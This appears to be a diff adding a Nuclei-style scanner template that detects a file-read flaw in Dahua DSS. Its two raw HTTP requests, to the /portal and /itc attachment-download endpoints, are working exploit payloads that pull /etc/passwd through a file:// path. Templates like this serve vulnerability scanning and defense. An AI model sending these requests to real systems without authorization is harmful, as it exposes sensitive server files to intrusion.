@@ -1,0 +1,42 @@
+id: dss-file-read
+
+info:
+  name: DSS File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    DSS File Read vulnerability allows unauthorized users to read sensitive files from the server, such as `/etc/passwd`.
+  reference:
+    - https://www.dahuatech.com/
+  tags: file-read,dss
+
+http:
+  - raw:
+      - |
+        GET /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0:root:/root:/bin/bash"
+
+  - raw:
+      - |
+        GET /itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0:root:/root:/bin/bash"
